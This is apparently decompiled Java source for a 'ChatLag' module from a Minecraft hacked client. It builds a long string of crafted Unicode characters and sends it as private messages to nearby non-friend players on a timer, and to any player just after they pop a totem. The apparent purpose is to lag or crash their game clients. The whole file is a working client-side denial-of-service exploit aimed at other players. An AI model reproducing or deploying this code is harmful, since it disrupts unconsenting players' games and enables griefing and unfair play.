/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.entity.Entity
 *  net.minecraft.entity.player.EntityPlayer
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketChatMessage
 */
package com.lemonclient.client.module.modules.qwq;

import com.lemonclient.api.event.events.TotemPopEvent;
import com.lemonclient.api.setting.values.BooleanSetting;
import com.lemonclient.api.setting.values.IntegerSetting;
import com.lemonclient.api.util.misc.Timing;
import com.lemonclient.api.util.player.social.SocialManager;
import com.lemonclient.api.util.world.EntityUtil;
import com.lemonclient.client.module.Category;
import com.lemonclient.client.module.Module;
import java.util.function.Predicate;
import me.zero.alpine.listener.EventHandler;
import me.zero.alpine.listener.Listener;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;

@Module.Declaration(name="ChatLag", category=Category.qwq)
public class ChatLag
extends Module {
    IntegerSetting maxPlayer = this.registerInteger("Max Player", 1, 0, 10);
    IntegerSetting range = this.registerInteger("Range", 16, 0, 256);
    BooleanSetting time = this.registerBoolean("Timing", true);
    IntegerSetting timingDelay = this.registerInteger("Timing Delay(10s)", 12, 0, 60, () -> (Boolean)this.time.getValue());
    IntegerSetting timingDelay2 = this.registerInteger("Timing Delay(s)", 0, 0, 10, () -> (Boolean)this.time.getValue());
    BooleanSetting pop = this.registerBoolean("After Pop", true);
    IntegerSetting blank = this.registerInteger("Pop Blank(s)", 5, 0, 60, () -> (Boolean)this.pop.getValue());
    IntegerSetting sendDelay = this.registerInteger("Send Delay(ms)", 0, 0, 1000, () -> (Boolean)this.pop.getValue());
    boolean popped;
    int sent;
    Timing timing = new Timing();
    Timing popTiming = new Timing();
    Timing sendTiming = new Timing();
    protected static final String LAG_MESSAGE = "\u0101\u0201\u0301\u0401\u0601\u0701\u0801\u0901\u0a01\u0b01\u0e01\u0f01\u1001\u1101\u1201\u1301\u1401\u1501\u1601\u1701\u1801\u1901\u1a01\u1b01\u1c01\u1d01\u1e01\u1f01 \u2101\u2201\u2301\u2401\u2501\u2701\u2801\u2901\u2a01\u2b01\u2c01\u2d01\u2e01\u2f01\u3001\u3101\u3201\u3301\u3401\u3501\u3601\u3701\u3801\u3901\u3a01\u3b01\u3c01\u3d01\u3e01\u3f01\u4001\u4101\u4201\u4301\u4401\u4501\u4601\u4701\u4801\u4901\u4a01\u4b01\u4c01\u4d01\u4e01\u4f01\u5001\u5101\u5201\u5301\u5401\u5501\u5601\u5701\u5801\u5901\u5a01\u5b01\u5c01\u5d01\u5e01\u5f01\u6001\u6101\u6201\u6301\u6401\u6501\u6601\u6701\u6801\u6901\u6a01\u6b01\u6c01\u6d01\u6e01\u6f01\u7001\u7101\u7201\u7301\u7401\u7501\u7601\u7701\u7801\u7901\u7a01\u7b01\u7c01\u7d01\u7e01\u7f01\u8001\u8101\u8201\u8301\u8401\u8501\u8601\u8701\u8801\u8901\u8a01\u8b01\u8c01\u8d01\u8e01\u8f01\u9001\u9101\u9201\u9301\u9401\u9501\u9601\u9701\u9801\u9901\u9a01\u9b01\u9c01\u9d01\u9e01\u9f01\ua001\ua101\ua201\ua301\ua401\ua501\ua601\ua701\ua801\ua901\uaa01\uab01\uac01\uad01\uae01\uaf01\ub001\ub101\ub201\ub301\ub401\ub501\ub601\ub701\ub801\ub901\uba01\ubb01\ubc01\ubd01";
    @EventHandler
    private final Listener<TotemPopEvent> totemPopEventListener = new Listener<TotemPopEvent>(event -> {
        if (ChatLag.mc.field_71441_e == null || ChatLag.mc.field_71439_g == null || !((Boolean)this.pop.getValue()).booleanValue() || this.popped) {
            return;
        }
        if (event.getEntity() == null) {
            return;
        }
        String name = event.getEntity().func_70005_c_();
        if (SocialManager.isFriend(name) || name.equals(ChatLag.mc.field_71439_g.func_70005_c_())) {
            return;
        }
        this.popped = true;
        this.popTiming.reset();
        ChatLag.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketChatMessage("/msg " + name + " " + LAG_MESSAGE));
    }, new Predicate[0]);

    @Override
    public void onUpdate() {
        if (ChatLag.mc.field_71441_e == null || ChatLag.mc.field_71439_g == null) {
            return;
        }
        this.sent = 0;
        if (this.popped && this.popTiming.passedS(((Integer)this.blank.getValue()).intValue())) {
            this.popped = false;
        }
        if (((Boolean)this.time.getValue()).booleanValue() && this.timing.passedS((Integer)this.timingDelay.getValue() * 10 + (Integer)this.timingDelay2.getValue())) {
            for (EntityPlayer player : ChatLag.mc.field_71441_e.field_73010_i) {
                if (this.sent >= (Integer)this.maxPlayer.getValue() && (Integer)this.maxPlayer.getValue() != 0) break;
                if (EntityUtil.basicChecksEntity(player) || ChatLag.mc.field_71439_g.func_70032_d((Entity)player) > (float)((Integer)this.range.getValue()).intValue() && (Integer)this.range.getValue() != 0) continue;
                ++this.sent;
                ChatLag.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketChatMessage("/msg " + player.func_70005_c_() + " " + LAG_MESSAGE));
            }
            this.timing.reset();
        }
    }
}
